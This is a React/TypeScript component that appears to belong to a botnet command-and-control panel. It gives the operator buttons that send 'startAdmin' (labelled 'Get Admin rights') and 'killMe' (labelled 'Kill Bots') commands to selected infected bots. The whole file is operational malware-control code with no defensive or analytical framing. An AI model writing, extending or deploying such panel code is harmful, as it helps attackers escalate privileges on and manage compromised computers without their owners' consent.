import { useContext } from 'react';
import { Button, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default ({load}: {load: () => void}) => {
  const { state, setState } = useContext(BotContext)

  const adminRight = () => {

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"startAdmin"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }

  const killBots = () => {


    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"killMe"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }

  return (
    <div className="pb-6">
      <h2 className="text-xl">Bots commantds</h2>
      <p className="text-stone-500">Send other commands to selected bots</p>
      <Button ghost type="primary" className="float-left" onClick={adminRight}>Get Admin rights</Button>
      <Button ghost type="primary" className="float-right" onClick={killBots}>Kill Bots</Button>
    </div>
  )
}